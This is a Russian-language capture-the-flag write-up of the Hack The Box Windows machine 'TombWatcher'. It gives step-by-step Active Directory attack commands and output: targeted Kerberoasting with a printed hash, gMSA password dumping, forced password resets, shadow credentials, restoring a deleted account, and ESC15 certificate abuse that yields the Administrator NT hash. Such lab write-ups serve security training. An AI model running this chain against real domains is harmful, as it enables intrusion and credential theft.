---
cover: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/59c74a969b4fec16cd8072d253ca9917.png
type: windows
status: SOLVED
level: "2"
---
> As is common in real life Windows pentests, you will start the TombWatcher box with credentials for the following account: henry / H3nry_987TGV!

```bash
└─$ nmap -sV -sC -vv 10.129.232.167 
```    

Nmap нашел 21 открытых портов:
![[Pasted image 20260506090054.png]]

Вот основные:
smb - 139, 445
http - 80
kerberoas - 53, 464
winrm - 5985
ldap - 389, 636, 3268/9, 
rpc - 135, 593

Пробую просмотреть шары с полученными кредами:
```bash
netexec smb 10.129.232.167 -u henry -p 'H3nry_987TGV!' --shares
```
![[Pasted image 20260506090652.png]]

Перечилсяю пользователей. Это нам не особо пригодиться...
```bash
netexec smb 10.129.232.167 -u henry -p 'H3nry_987TGV!' --users
```
![[Pasted image 20260506090736.png]]

На веб порту видим обычную windows страницу.
![[Pasted image 20260506090937.png]]

Я также имею доступ к ldap:
```bash
netexec ldap DC01.tombwatcher.htb -u henry -p 'H3nry_987TGV!'

OUTPUT:
[+] tombwatcher.htb\henry:H3nry_987TGV!
```

Поэтому я решил запустить `rusthound` для сбора файлов для анализа:
```bash
rusthound-ce -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' -c All -z

OUTPUT:
RustHound-CE Enumeration Completed at 09:10:45 on 05/06/26! Happy Graphing!
```

Загружаем полученный zip архив в `bloodhound`. Через минуту `bloodhound` завершает загрузку. Переходим на страницу `explore`.
![[Pasted image 20260506091253.png]]

Помечаем нашего пользователя `henry` как `owned`.
![[Pasted image 20260506091400.png]]

Я нашел такой вот путь до пользователя `john`. Я пойду по нему...
![[Pasted image 20260506092241.png]]

### WriteSPN
![[Pasted image 20260510121850.png]]
У меня есть права `WriteSPN` над `alfred`. Будем использовать атаку кербероастинг... Kerberoasting нацелена на учетную запись службы, поскольку в ней настроено имя участника службы (SPN), а это значит, что любой аутентифицированный пользователь может запросить TGS для этой учетной записи. Этот TGS шифруется паролем учетной записи службы, и если этот пароль слабый, его можно подобрать методом перебора.

Сначала нужно пофикчить `clockskew` для взаимодействия с `kerberoas`.
```bash
sudo timedatectl set-ntp off
sudo ntpdate 10.129.232.167
```

Затем используя targetedKerberoast.py скрипт на питоне, проводим атаку.:
```bash
python3 targetedKerberoast.py -v -d 'tombwatcher.htb' -u henry -p 'H3nry_987TGV!' --dc-ip 10.129.232.167 --request-user alfred
```

Получаем хэш:
```
[*] Starting kerberoast attacks
[*] Attacking user (alfred)
[VERBOSE] SPN added successfully for (Alfred)
[+] Printing hash for (Alfred)
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$e24e513feb9c0a3bee4b39e66930a746$4d1b675d2e3560f36d563fb7fb736bb7b48c58896d4903e41dc744de4681fdcefe49a443b09a80eb4e5cc9c3c012820a767946268aaae987899d7ad28e655df4207b84c37d76582c726221ab92d762c738fad4dcc3300c6a6556018dce3b010e450f70a73e4a3cc5c74c8c96c7431dd9a71fff817fc0656cbe24be8a8976cb6504df6fc00219d3b848212a5d53d15d9c4ddf21ff20e52bb0059529edf743f352cf626e6f2c286f08e5361897d0b2bc1769d085e16822caf099b6b176cdb3b39cc5cc68a610a14edb5da7b45458b1182a6686af5dbb716b27cacd1b9eb1fbd0c37afff8a438663d8df88cee2e2721daa291168c2195846c48ced289c23c9de18e3a691325d36b0ab451d968ddcc52d4adb6cee2ab611dc99060a0de0b4bc32fe735b65900168d1df07cae9ceb2131c2b2f79f45eba8ec0f75882c7991db69e434bf9ff7d63f2751bcace0d8cc1aa3fb0a8db4d4673cba48c5a607960e21165caf92db5628b7048bcf119af07174229ac2b1a55ede24f0d1243077ea1a810e3d190255de7147fed1abe712b7ee7782e2f98f2b3b2c509cdb21522bc1c8f0bffde570b9995587aff910c2af8b1a8e315a441bd7e9097e33ab3f9de82a3ea4a3dfe179b58e59b5a29909c7ccbd33d057f11c10abad9ba63d4c680da558d7603279db3adf9c294ea9c406d32e5a5a7391b705202acc03e0ad541997e807d548ba356d5533c991cfb16dd81bf142d024277c880b7f0615fc362b236b7ee05b52643a41e4e20e4aea2615935a8e29b6a2fdaa3aa4c46134e19ddcf3e64b75b860db96c21d778ead9a88324f27f525c57c3cfe269eaadec1ae2c221a9ee5c5465bde5a2935879b49e724bb162f9889fecda35c0c360a1339f022a98e2330d27dde818b8a235f3c22284a16af69616f6da2b754ed3741d33166d22666b58654bb0bd7b8da9277b6883de4ac7929586732531dd3b572c3f49c6a1111ea22b7852d1bc2128c46a1f0fe3a5d96c16662ce0f63c522e99faf9b85ec8f1838d84deb640126d7f7cb311c7544cc2e5146709353a12c54be653f6cfabcb289f4c5f1b73114d79bc3612a37c56a33ba98b77d0a4ce5bc3b93969d4f637c97e7002997127bd799b23e08cf0c887d5e32e57a1f94a587dbbc6566cd10df72c348baae244f82b92a38ed87d1b4dc5ce71cc6bdf90895a1ba802a1028247bcd4886e3da80cd7198de7ae4647cb025052ac06a6389a4b5331eac8a76197f317ec5bfb465e0e17881f598b37b4b6edf3a8c2a18f3ad4597735cd18a5d8ca7920459854d805aa84f78d6cb307ed00bf5f0bb3ba119bdb5f9bfdc3163779a019753e45a0925d07d0d84d61f914e52b2672aa2270942137ee15f098318fd3b82487c55944d689388305235aa23d5ebcd3b36dbc357c27e4adf5140ac012adc0e3859e51ed69699573ff9d3ca76cd953d95bd9acef2a9f09e7e6c1375ccbfea7d0624
[VERBOSE] SPN removed successfully for (Alfred)
```

Пробуем угадать пароль при помощи `hashcat`:
```bash
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```
Паролем оказалось слово `basketball`. Я попробовал посмотреть к чему этот аккаунт имеет доступ с помощью `netexec`. Ничего нового не нашел...

### AddSelf
![[Pasted image 20260510121915.png]]
`alfred` может добавить себя в группу INFRASTRUCTURE. Использую инструмент `bloodyAD` для этого:

```bash
bloodyAD -u alfred -p basketball -d tombwatcher.htb --host 10.129.232.167 add groupMember INFRASTRUCTURE alfred

OUTPUT:
[+] alfred added to INFRASTRUCTURE
```

### ReadGMSAPassword
![[Pasted image 20260510122102.png]]
> A **Group Managed Service Account (gMSA)** is a domain account used by services (like IIS or SQL). Unlike regular users, Windows automatically manages the password (usually 240 characters long) and rotates it every 30 days. The password is stored in an attribute called msDS-ManagedPassword. By default, you cannot read this. However, the **ReadGMSAPassword** right (technically the msDS-ManagedPasswordRead right) allows members of a specific group to decrypt this attribute and retrieve the password.

Для чтения пароля я буду использовать инструмент [gMSADumper](https://github.com/micahvandeusen/gMSADumper).

%% Также в этот момент у меня возникла сложность с чтением пароля. Потом я понял, что домене стоит какой-то скрипт, который чистиет или убирает права... Поэтому пришлось повторить предыдушие шаги еще раз... %%

```bash
python3 gMSADumper.py -u alfred -p basketball -d tombwatcher.htb

OUTPUT:
Users or groups who can read password for ansible_dev$:
 > Infrastructure
ansible_dev$:::7e792e4c14e4040a0b4f18235a6afe55
ansible_dev$:aes256-cts-hmac-sha1-96:a025758863121a7fe489ba640da9d1d37ac85ff6c0547bff0f25bc0cb25bf649
ansible_dev$:aes128-cts-hmac-sha1-96:f43746eee24abcf409d2f3c798563bde
```

Получаем хэш для пользователя `ansible_dev$` - 7e792e4c14e4040a0b4f18235a6afe55.

### ForceChangePassword
![[Pasted image 20260510122700.png]]

`ansible_dev$` имеет право на ForceChangePassword пользователю `sam`.

Я использовал rpcclient для это задачи:
```bash
rpcclient -U "tombwatcher.htb/ansible_dev$" --pw-nt-hash '7e792e4c14e4040a0b4f18235a6afe55' -I 10.129.232.167

> setuserinfo2 sam 24 Fsociety_1337
```

Проверяем получили ли мы доступ к аккаунта sam-a:
```bash
netexec smb 10.129.232.167 -u 'sam' -p 'Fsociety_1337'

OUTPUT:
[+] tombwatcher.htb\sam:Fsociety_1337
```

### WriteOwner
![[Pasted image 20260510123002.png]]
Наконец `sam` имеет `WriteOwner` над `john`-ом. С помощью `WriteOwner` я могу назначить sam-a владельцем учетной записи john-a. В качестве владельца sam может разрешить ему использовать `genericAll`. После этого sam может либо установить пароль john-a, либо получить `shadowCreds`, либо использовать целевой Kerberoast.

Я начну с установки владельца над джоном на сэма используя `bloodyAD`:
```bash
bloodyAD -u sam -p Fsociety_1337 -d tombwatcher.htb --host 10.129.232.167 set owner john sam 

OUTPUT:                                               
[+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by sam on john
```

Теперь нужно выдать себе `GenericAll` над джони:
```bash
bloodyAD -u sam -p Fsociety_1337 -d tombwatcher.htb --host 10.129.232.167 add genericAll john sam  

OUTPUT:
[+] sam has now GenericAll on john
```

Используя `bloodyAD`, я проверну shadow credential атаку...
```bash
bloodyAD -u sam -p Fsociety_1337 -d tombwatcher.htb --host 10.129.232.167 add shadowCredentials john

OUTPUT:
[+] KeyCredential generated with following sha256 of RSA key: 0bebacfbb20b12a44ef7fce1569524b7275586356b326b8af3be03822d59f3cb
[+] TGT stored in ccache file john_lr.ccache
```

Получаем NTLM хэш сэма - ad9324754583e3e42b55aad4d3b8d2bf.

В `bloodhound` видно, что мы состоим в группе REMOTE MANAGEMENT USERS. Поэтому мы можем использовать wimrm для подключения к системе...
![[Pasted image 20260506145339.png]]
```bash
evil-winrm -i DC01.tombwatcher.htb -u john -H ad9324754583e3e42b55aad4d3b8d2bf
```

Получаем первый флаг:
![[Pasted image 20260506145458.png]]

# root
Я еще раз решил посмотреть в `bloodhound`. Увидел следующее:
![[Pasted image 20260510123910.png]]
Мы имеем `GenericAll` над ADCS. Можем взять полный контроль над этим OU... Пока не понятно только...

Я решил запустить certipy для просмотра шаблонов
```bash
certipy-ad find -u john -hashes ad9324754583e3e42b55aad4d3b8d2bf -dc-ip 10.129.232.167
```

Я просмотрел все шаблоны и заметил этот:
```
17
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions            
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          S-1-5-21-1392491010-1358638721-2126982587-1111
      Object Control Permissions        
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          S-1-5-21-1392491010-1358638721-2126982587-1111
```
Странно, что один объект представлен по его sid-у, а не по имени... Я посмотел этого юзера в bloodhound-е. Там про него информация тоже отсутствует...

Я попробовал получить информацию с хоста о этом sid-е, но тоже ничего не получил:
```powershell
Get-ADObject -Identity "S-1-5-21-1392491010-1358638721-2126982587-1111"

OUTPUT:
Cannot find an object with identity: 'S-1-5-21-1392491010-1358638721-2126982587-1111' under: 'DC=tombwatcher,DC=htb'.
```
Возможно объект был удален...

Я нашел такую вот командку для просмотра удаленных объектов:
```powershell
Get-ADObject -SearchBase "CN=Deleted Objects,DC=tombwatcher,DC=htb" -IncludeDeletedObjects -Filter {ObjectSID -eq "S-1-5-21-1392491010-1358638721-2126982587-1111"} -Properties *

OUTPUT:
accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
CN                              : cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
codePage                        : 0
countryCode                     : 0
Created                         : 11/16/2024 12:07:04 PM
createTimeStamp                 : 11/16/2024 12:07:04 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
dSCorePropagationData           : {11/16/2024 12:07:10 PM, 11/16/2024 12:07:08 PM, 12/31/1600 7:00:00 PM}
givenName                       : cert_admin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 11/16/2024 12:07:27 PM
modifyTimeStamp                 : 11/16/2024 12:07:27 PM
msDS-LastKnownRDN               : cert_admin
Name                            : cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
objectSid                       : S-1-5-21-1392491010-1358638721-2126982587-1111
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133762504248946345
sAMAccountName                  : cert_admin
sDRightsEffective               : 7
sn                              : cert_admin
userAccountControl              : 66048
uSNChanged                      : 13197
uSNCreated                      : 13186
whenChanged                     : 11/16/2024 12:07:27 PM
whenCreated                     : 11/16/2024 12:07:04 PM
```
Имеется пользователь с именем cert_admin. Атрибут `lastKnownParent` добавлен к удаленным объектам, и он показывает, что он находился в ADCS.

Так как `john` имеет `GenericAll` над ADCS. Мы можем попробовать восстановить аккаунт...
```powershell
Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
*Evil-WinRM* PS C:\Users\john\Documents> Get-ADUser cert_admin

OUTPUT:
DistinguishedName : CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb
Enabled           : True
GivenName         : cert_admin
Name              : cert_admin
ObjectClass       : user
ObjectGUID        : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
SamAccountName    : cert_admin
SID               : S-1-5-21-1392491010-1358638721-2126982587-1111
Surname           : cert_admin
UserPrincipalName :
```
Кажется, что сработало

Для доступа к этому аккаунту, просто поменяем ему пароль:
```powershell
$pass = ConvertTo-SecureString "IamD0newithyou" -AsPlainText -Force
*Evil-WinRM* PS C:\Users\john\Documents> Set-ADAccountPassword -Identity "cert_admin" -NewPassword $pass
```

Проверяем доступ:
```bash
netexec smb 10.129.232.167 -u 'cert_admin' -p 'IamD0newithyou'

OUTPUT:
 [+] tombwatcher.htb\cert_admin:IamD0newithyou
```

Попробую опять запустить certipy для выявления уязвимых шаблонов:
```bash
certipy-ad find -u cert_admin -p IamD0newithyou -dc-ip 10.129.232.167 -vulnerable
```

Получаем это:
```
Certificate Templates
  0
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
```

Из certipy wiki:
> ESC15, also known by the community name “EKUwu” (research by Justin Bollinger from TrustedSec) and tracked as CVE-2024-49019, describes a vulnerability affecting unpatched CAs. It allows an attacker to inject arbitrary Application Policies into a certificate issued from a Version 1 (Schema V1) certificate template. If the CA has not been updated with the relevant security patches (Nov 2024), it will incorrectly include these attacker-supplied Application Policies in the issued certificate. This occurs even if these policies are not defined in, or are inconsistent with, the template’s intended Extended Key Usages (EKUs), thereby granting the certificate unintended capabilities.

Тут есть два сценария для эксплуатации:
* Сценарий А ( не проходит ):

Я запросил сертификат администратора:
```bash
certipy-ad req -u cert_admin -p IamD0newithyou -dc-ip 10.129.232.167 -target DC01.tombwatcher.htb -ca 'tombwatcher-CA-1' -template 'WebServer' -upn administrator@tombwatcher.htb -application-policies 'Client Authentication'
```

Я попробовал авторизоваться используя полученный pfx, но ничего не вышло...
![[Pasted image 20260506135006.png]]

* Сценарий B:

На этот раз вместо того, чтобы наделять полученный сертификат возможностью аутентификации, я добавлю к нему свойство агента:

```bash
certipy-ad req -u cert_admin -p IamD0newithyou -dc-ip 10.129.232.167 -target DC01.tombwatcher.htb -ca 'tombwatcher-CA-1' -template 'WebServer' -application-policies 'Certificate Request Agent'
```

Используя этот pfx я запрошу билет как администратор для шаблона, который используется для авторизации пользователей:
```bash
certipy-ad req -u cert_admin -p IamD0newithyou -dc-ip 10.129.232.167 -target DC01.tombwatcher.htb -ca 'tombwatcher-CA-1' -template 'User' -pfx cert_admin.pfx -on-behalf-of 'tombwatcher\Administrator'
```

Теперь с этим сертификатом можем получить ntlm хэш:
```bash
certipy-ad auth -dc-ip 10.129.232.167 -pfx administrator.pfx

OUTPUT:
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc
```

Используя evil-winrm, получаем доступ к системе. Находим финальный флаг:
![[Pasted image 20260506174726.png]]


